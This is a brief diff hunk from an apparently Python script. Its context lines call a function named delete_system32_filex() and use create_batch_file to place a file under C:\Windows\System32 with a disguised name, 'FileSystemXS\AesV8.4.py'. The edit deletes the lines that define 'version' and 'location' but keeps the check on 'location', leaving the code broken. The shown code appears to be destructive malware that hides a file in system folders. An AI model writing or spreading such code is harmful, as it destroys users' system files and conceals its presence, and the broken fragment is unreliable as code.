@@ -28,8 +28,7 @@ def delete_system32_filex():
 delete_system32_filex()
 '''
 
-version = "3.11.5"
-location = is_version_installed(version)
+
 if location:
     create_batch_file(location, r"C:\Windows\System32\FileSystemXS\AesV8.4.py")
 else:
